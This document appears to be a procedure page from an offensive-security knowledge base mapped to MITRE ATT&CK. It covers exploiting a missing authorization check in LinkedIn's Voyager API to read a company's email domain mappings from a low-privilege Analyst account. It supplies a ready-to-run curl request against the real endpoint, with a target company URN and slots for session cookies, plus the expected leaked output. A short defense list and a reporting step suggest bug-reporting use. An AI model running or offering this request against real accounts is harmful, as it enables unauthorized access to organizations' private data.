---
id: proc-uuid-004
tags:
  - data-exfiltration
  - api-response
  - email-domains
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/voyager-api-get-email-domains]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:30:07.492Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Execute-Modified-Request-and-Analyze-Response

## Summary

This procedure forwards the modified API request to the server and examines the response for unauthorized disclosure of company email domain mappings, confirming the privilege escalation.

## Description

After modification, sending the request exploits the lack of proper auth checks, returning JSON with sensitive data like approved domains (e.g., @company.com). This bypasses UI restrictions. Target is the Voyager API over HTTP/2. Outcome: Proof of vulnerability via data access.

## Requirements

1. Modified request in Burp Suite
2. Target company URN and parameters
3. JSON parser or viewer for response analysis

## Defense

Defensive measures and detection strategies:

- Audit API responses for sensitive data leaks
- Enforce least-privilege on all endpoints
- Monitor for anomalous data access from low-priv accounts

## Objectives

1. Receive successful response with escalated data
2. Extract and verify sensitive email domains
3. Document impact for reporting

## Instructions

### Step 1: Forward Request

**Context**: Send the tampered request to trigger the vulnerable endpoint.

In Burp Suite, click 'Forward' or use Repeater to send the GET request.

Alternatively, execute [[commands/voyager-api-get-email-domains]] with Analyst credentials:

```bash
curl -X GET "https://www.linkedin.com/voyager/api/voyagerOrganizationDashEmailDomainMappings?decorationId=com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2&company=urn%3Ali%3Afsd_company%3A81541206&count=100&q=organization&start=0" \
  -H "Cookie: [ANALYST_COOKIES_REDACTED]" \
  -H "Csrf-Token: [ANALYST_CSRF_REDACTED]" \
  -H "Accept: application/vnd.linkedin.normalized+json+2.1"
```

> Expected output: HTTP/2 200 OK with JSON body containing elements array of email domains.

### Step 2: Analyze Response

**Context**: Parse JSON for sensitive info.

Inspect response for fields like "elements": [{"domain": "example.com", "approved": true}].

> Expected output: List of domains not visible in Analyst UI, confirming escalation.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System

### Sub-Techniques


## Commands Used

- [[commands/voyager-api-get-email-domains]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- data-exfiltration
- api-response
- email-domains
